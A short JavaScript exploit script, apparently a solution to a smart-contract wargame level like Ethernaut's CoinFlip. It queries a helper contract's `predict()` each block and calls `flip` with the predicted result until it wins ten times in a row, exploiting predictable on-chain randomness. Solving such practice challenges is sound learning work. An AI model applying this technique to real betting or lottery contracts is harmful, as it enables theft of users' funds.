async function win() {
    let consecutivewins = 0;
    let lastBlockNumber;
    let abi = [
	{
		"constant": true,
		"inputs": [],
		"name": "blocknum",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "predict",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}
    ]
    let address = '0x26759f2ff8e5e9ddcee26c6d97520fa9aa43eeb1';
    let predictContract = new web3.eth.Contract(abi, address);
    while (consecutivewins < 10) {
    	try {
			let currentBlockNumber = await predictContract.methods.blocknum().call();
			if (lastBlockNumber == currentBlockNumber) {
				console.log("Waiting for next block.");
				continue;
			}  
			lastBlockNumber = currentBlockNumber;
			let tf = await predictContract.methods.predict().call();
			let success = await contract.flip(tf);
			if (success) {
				consecutivewins++;
			} else {
				consecutivewins = 0;
			}
    	} catch (rejected) {
    		console.log("Failed.")
    	}
        
    }
}